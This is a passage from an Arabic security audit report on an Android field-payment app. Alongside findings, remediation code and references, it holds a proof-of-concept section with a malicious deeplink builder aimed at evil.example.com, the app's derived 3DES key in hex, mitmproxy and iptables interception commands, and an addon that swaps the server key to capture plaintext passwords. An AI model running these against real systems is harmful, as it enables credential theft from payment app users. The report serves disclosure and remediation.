رابط واحد بنقرة يحول كل بيانات الضحية لخادم المهاجم.

### 🔴 F-07: WebView - UniversalAccessFromFileURLs
**OWASP MASVS:** MSTG-PLATFORM-6 | **CVSS:** ~7.5 (High)
السماح بقراءة الملفات المحلية (Tokens، DB) من سياق JS.

### 🔴 F-10: usesCleartextTraffic
**OWASP MASVS:** MSTG-NETWORK-2 | **CVSS:** ~6.5 (Medium)
السماح بـ HTTP plaintext في حالات الخطأ.

---

## 12. مخططات استغلال (PoC) <a name="poc"></a>

تم بناء أداة Python كاملة في [`06_findings/decrypt_ecas_poc.py`](../06_findings/decrypt_ecas_poc.py)

**الاستخدام:**
```bash
# 1. اختبار صحة الخوارزمية
python3 decrypt_ecas_poc.py test

# 2. تشفير IP لاستخدامه في deeplink
python3 decrypt_ecas_poc.py encrypt "evil.example.com:8057/payment"
# Output: ciphertext to use as ?ip=

# 3. فك تشفير ciphertext من logs/الكاش
python3 decrypt_ecas_poc.py decrypt "Be0/eedD9Lz8Q2518gO16Eg..."

# 4. بناء deeplink ضار جاهز للهجوم
python3 decrypt_ecas_poc.py craft "evil.example.com:8057/payment"
# Output: https://ecas.web.link/?ip=Be0%2FeedD9Lz...
```

**مفتاح 3DES المشتق (للاستخدام في mitmproxy scripts):**
```
Hex (24 bytes):
5f44eaf8424b7d04365abbda5232a2f5 5f44eaf8424b7d04
```

**MITM Scenario كامل:**

1. **التحضير:**
   - راوتر يدعم WPA2 enterprise أو نقطة Wi-Fi مفتوحة في موقع الجابي
   - mitmproxy على لاب توب: `mitmproxy --mode transparent --ssl-insecure -p 8080`
   - iptables redirect: `iptables -t nat -A PREROUTING -p tcp --dport 8057 -j REDIRECT --to 8080`

2. **التنفيذ:**
   ```python
   # mitm_addon.py
   from mitmproxy import http
   import json
   
   def request(flow: http.HTTPFlow):
       if "/api/Users/getAppPK" in flow.request.path:
           # Replace public key with attacker's
           flow.response = http.Response.make(
               200, json.dumps({
                   "a": "<attacker_modulus_b64>&<exponent_b64>",
                   "e": 0
               }),
               {"Content-Type": "application/json"}
           )
   
       if "/api/Users/Login" in flow.request.path:
           body = json.loads(flow.request.content)
           # Decrypt password using attacker's private key
           encrypted = body["Password"]
           plaintext = rsa_decrypt(attacker_priv_key, encrypted)
           print(f"[CAPTURED] User: {body['Username']} | Pass: {plaintext}")
   ```

3. **النتيجة:** سرقة كلمات المرور بالنص الصريح.

---

## 13. التحليل الديناميكي - ملاحظات وتوصيات <a name="dynamic"></a>

لم يتم إجراء تحليل ديناميكي في بيئة sandbox الحالية، لكن إذا توفر جهاز Android (مروت)، يُنصح بـ:

### 13.1 إعداد البيئة
- جهاز Android 8-11 (لتغطية minSdk=19 و targetSdk=32)
- Magisk + LSPosed + Frida Server
- mitmproxy / Burp Suite
- Drozer للـ IPC analysis

### 13.2 نصوص Frida المُقترحة

**A. تتبع استدعاءات التشفير (Crypto Tracer):**
```javascript
Java.perform(function() {
    var Cipher = Java.use('javax.crypto.Cipher');
    Cipher.doFinal.overload('[B').implementation = function(data) {
        console.log('[Cipher] algorithm: ' + this.getAlgorithm());
        console.log('[Cipher] input hex: ' + Java.array('byte', data).map(b => 
            ('0' + (b & 0xff).toString(16)).slice(-2)).join(''));
        var result = this.doFinal(data);
        console.log('[Cipher] output hex: ' + Java.array('byte', result).map(b => 
            ('0' + (b & 0xff).toString(16)).slice(-2)).join(''));
        return result;
    };
});
```

**B. كشف الـ deeplink handler:**
```javascript
Java.perform(function() {
    var LoginActivity = Java.use('com.egy.webpaymentapp.Screens.LoginActivity');
    LoginActivity.A.implementation = function() {
        console.log('[LoginActivity.A] called');
        console.log('[LoginActivity.A] intent data: ' + this.getIntent().getData());
        return this.A();
    };
});
```

**C. تجاوز Magic Backdoor للوصول المباشر:**
```javascript
// عبر MediaSessionCompat.C() لإنشاء user وهمي يدخل MainActivity
```

### 13.3 ما يجب مراقبته

| المراقبة | الأداة | ما يجب البحث عنه |
|----------|--------|------------------|
| Network traffic | mitmproxy | كل API calls، payloads مشفرة |
| SharedPreferences | ADB shell | محتوى `/data/data/com.egy.webpaymentapp/shared_prefs/` |
| Filesystem | inotify/strace | كتابة الصور، DBs خاصة |
| Logcat | `adb logcat -s xmy:* WebViewCustomization:*` | تسريب بيانات في logs |
| Memory | Frida `memory_dump` | البحث عن tokens/keys في الذاكرة |
| WebView | Chrome DevTools | إعادة بناء JS الذي يُحقن في الصفحات |

---

## 14. التوصيات والإصلاحات <a name="recommendations"></a>

### 14.1 إصلاحات حرجة فورية (P0 - يجب قبل أي نشر جديد)

#### إصلاح TrustManager:
```java
// استبدال الـ TrustManager المُعطل
TrustManagerFactory tmf = TrustManagerFactory.getInstance(
    TrustManagerFactory.getDefaultAlgorithm());
tmf.init((KeyStore) null);  // استخدام شهادات النظام

SSLContext ctx = SSLContext.getInstance("TLS");
ctx.init(null, tmf.getTrustManagers(), null);
HttpsURLConnection.setDefaultSSLSocketFactory(ctx.getSocketFactory());
// لا تعدل HostnameVerifier — استخدم الافتراضي
```

#### إضافة Certificate Pinning بـ OkHttp:
```java
CertificatePinner certificatePinner = new CertificatePinner.Builder()
    .add("abbasiy.yedns.org", "sha256/<actual_pin_here>")
    .add("abbasiy.yedns.org", "sha256/<backup_pin>")
    .build();

OkHttpClient client = new OkHttpClient.Builder()
    .certificatePinner(certificatePinner)
    .build();
```

#### حذف Magic Backdoor:
```java
// LoginActivity.java - حذف هذه الـ block بالكامل
if (this.q.getText().toString().equals("1") && 
    this.r.getText().toString().equals("1") && 
    this.s.getText().toString().equals("1")) {
    // ← احذف
}
```

#### إصلاح Deeplink:
```java
// إضافة validation
if (getIntent() != null && getIntent().getData() != null) {
    Uri data = getIntent().getData();
    
    // التحقق من المُرسِل (referrer)
    Uri referrer = getReferrer();
    if (referrer == null || !isAllowedReferrer(referrer)) {
        Log.w(TAG, "Untrusted deeplink referrer");
        return;
    }
    
    // التحقق من توقيع HMAC على المعاملات
    String ip = data.getQueryParameter("ip");
    String sig = data.getQueryParameter("sig");
    if (!verifyHmac(ip, sig, BuildConfig.DEEPLINK_HMAC_KEY)) {
        Log.w(TAG, "Invalid deeplink signature");
        return;
    }
    
    // عرض dialog تأكيد قبل التغيير
    showConfirmDialog("هل تريد تغيير خادم API إلى " + ip + "؟", 
        () -> updateServer(ip));
}
```

#### إصلاح WebView:
```java
WebSettings ws = webview.getSettings();
ws.setJavaScriptEnabled(true);  // ضروري للوظائف
ws.setAllowFileAccess(false);    // ✅
ws.setAllowContentAccess(false); // ✅
ws.setAllowFileAccessFromFileURLs(false);     // ✅
ws.setAllowUniversalAccessFromFileURLs(false); // ✅ حرج
ws.setDomStorageEnabled(true);
ws.setMixedContentMode(WebSettings.MIXED_CONTENT_NEVER_ALLOW);

// تقييد JS-bridge بفحص الـ origin
webview.setWebViewClient(new WebViewClient() {
    @Override
    public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest req) {
        // فقط نطاقات موثوقة
        return !isAllowedDomain(req.getUrl().getHost());
    }
    
    @Override
    public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
        handler.cancel();  // ✅ ارفض، لا تَقبل
    }
});

// تقييد الـ JS interface بـ token authentication
webview.addJavascriptInterface(new SecureBridge(this, sessionToken), "mobile");
```

#### إصلاح التشفير:
```java
// استبدال DESede بـ AES-256-GCM
private static final String KEYSTORE_ALIAS = "ecas_master_key";

private SecretKey getOrCreateKey() {
    KeyStore ks = KeyStore.getInstance("AndroidKeyStore");
    ks.load(null);
    if (!ks.containsAlias(KEYSTORE_ALIAS)) {
        KeyGenerator kg = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore");
        kg.init(new KeyGenParameterSpec.Builder(KEYSTORE_ALIAS,
                KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)
                .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
                .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
                .setKeySize(256)
                .build());
        return kg.generateKey();
    }
    return ((KeyStore.SecretKeyEntry) ks.getEntry(KEYSTORE_ALIAS, null)).getSecretKey();
}
```

### 14.2 إصلاحات متوسطة المدى (P1)

1. **EncryptedSharedPreferences** بدلاً من العادية:
```java
SharedPreferences prefs = EncryptedSharedPreferences.create(
    "USER_DETAILS_PREF",
    MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC),
    context,
    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
);
```

2. **Network Security Config:**
```xml
<!-- res/xml/network_security_config.xml -->
<network-security-config>
    <base-config cleartextTrafficPermitted="false">
        <trust-anchors>
            <certificates src="system"/>
        </trust-anchors>
    </base-config>
    <domain-config>
        <domain includeSubdomains="true">abbasiy.yedns.org</domain>
        <pin-set>
            <pin digest="SHA-256">...</pin>
            <pin digest="SHA-256">...</pin>
        </pin-set>
    </domain-config>
</network-security-config>
```

3. **إصلاح أسماء الأذونات** (إزالة `Manifest.permission.` prefix).
4. **إزالة الأذونات المفرطة** (`MANAGE_EXTERNAL_STORAGE`, `REQUEST_INSTALL_PACKAGES`, `DOWNLOAD_WITHOUT_NOTIFICATION`, `ACCESS_SUPERUSER`).
5. **إضافة `FLAG_SECURE`** لمنع screenshot:
```java
getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE,
                    WindowManager.LayoutParams.FLAG_SECURE);
```

### 14.3 إصلاحات طويلة المدى (P2)

1. **Root/Tamper Detection** (مكتبة RootBeer أو SafetyNet Attestation API):
```java
RootBeer rootBeer = new RootBeer(this);
if (rootBeer.isRooted()) {
    // قرار: عرض تحذير، أو غلق ميزات حساسة
}
```

2. **DexGuard / R8 Aggressive Obfuscation:**
   - حذف أسماء الفئات الأصلية
   - تشفير السلاسل (string encryption)
   - Control flow flattening

3. **Native code للأسرار** (نقل المفاتيح إلى `.so` library + JNI):
```c
// libsecrets.c
JNIEXPORT jstring JNICALL
Java_com_egy_webpaymentapp_NativeSecrets_getKey(JNIEnv *env, jobject obj) {
    char key[32];
    // ... obfuscated key generation
    return (*env)->NewStringUTF(env, key);
}
```

4. **Play Integrity API** للتحقق من البيئة:
```java
IntegrityManager integrityManager = IntegrityManagerFactory.create(context);
IntegrityTokenRequest request = IntegrityTokenRequest.builder()
    .setNonce(generateNonce())
    .setCloudProjectNumber(BuildConfig.PROJECT_NUMBER)
    .build();
```

5. **مراجعة أمنية خارجية + Bug Bounty**.

### 14.4 توصيات معمارية

1. **فصل طبقة الشبكة** عن طبقة العرض (MVVM)
2. **استخدام Retrofit + OkHttp** بدلاً من Volley القديم
3. **Repository pattern** للبيانات
4. **Hilt/Dagger** للحقن
5. **CI/CD** مع SAST (MobSF) و DAST (OWASP ZAP)

---

## 15. المراجع <a name="references"></a>

### 15.1 معايير الأمان المُستشهد بها
- [OWASP MASTG](https://mas.owasp.org/MASTG/) — Mobile Application Security Testing Guide
- [OWASP MASVS](https://mas.owasp.org/MASVS/) — Mobile Application Security Verification Standard
- [NIST SP 800-67 Rev. 2](https://csrc.nist.gov/publications/detail/sp/800-67/rev-2/final) — Triple DES Deprecation
- [PCI DSS v4.0](https://www.pcisecuritystandards.org/) — Payment Card Industry Data Security Standard

### 15.2 وثائق Android الرسمية
- [Android Manifest Permissions](https://developer.android.com/reference/android/Manifest.permission)
- [Network Security Configuration](https://developer.android.com/training/articles/security-config)
- [WebView Security](https://developer.android.com/guide/webapps/webview)
- [Android Keystore](https://developer.android.com/training/articles/keystore)
- [EncryptedSharedPreferences](https://developer.android.com/reference/androidx/security/crypto/EncryptedSharedPreferences)

### 15.3 الأدوات المستخدمة
- [APKTool](https://apktool.org/) — Reverse engineering APK files
- [JADX](https://github.com/skylot/jadx) — Dex to Java decompiler

### 15.4 أبحاث ذات صلة
- Wermke, D. et al. (2018). *"A Large Scale Investigation of Obfuscation Use in Google Play."* ACSAC 2018. [arXiv:1801.02742](https://arxiv.org/abs/1801.02742)
- Li, L. et al. (2017). *"Static analysis of Android apps: A systematic literature review."* IST.
- Fahl, S. et al. (2012). *"Why Eve and Mallory Love Android: An Analysis of Android SSL (In)Security."* CCS 2012. — السلف الكلاسيكي لثغرة TrustManager المُعطل.

### 15.5 ثغرات WebView ذات صلة
- CVE-2012-6636 — `addJavascriptInterface` RCE قبل API 17
- CVE-2014-1939 — Insecure `setAllowUniversalAccessFromFileURLs`

---

## 16. خاتمة

تطبيق **ECAS WEB v18.4** هو تطبيق POS/تحصيل ميداني وظيفياً مكتمل، لكنه يحمل **عيوباً أمنية بنيوية** تجعله غير مناسب لمعالجة بيانات مالية في الوضع الحالي. الجمع بين:
1. تعطيل كامل لـ TLS validation
2. مفتاح تشفير ثابت
3. deeplink ضعيف الحماية
4. WebView بإعدادات خطيرة
5. غياب أي طبقة دفاع ضد RE

يوفر للمهاجم **مسارات استغلال متعددة وسهلة**، خاصة في البيئات التي يعمل فيها التطبيق (شبكات Wi-Fi غير موثوقة، أجهزة جابي محمولة).

**التوصية النهائية:** يجب تجميد التطبيق في الإنتاج فوراً، وإجراء عملية إعادة معمارية شاملة لطبقة الأمان بقيادة مدقق أمني محترف. الإصلاحات المُقترحة في القسم 14 تشكل خارطة طريق عملية لإعادة البناء.

---

**نهاية التقرير**

🔒 *تم إعداد هذا التقرير لأغراض البحث الأمني والتعليم فقط. الاستخدام الأخلاقي مسؤولية القارئ.*
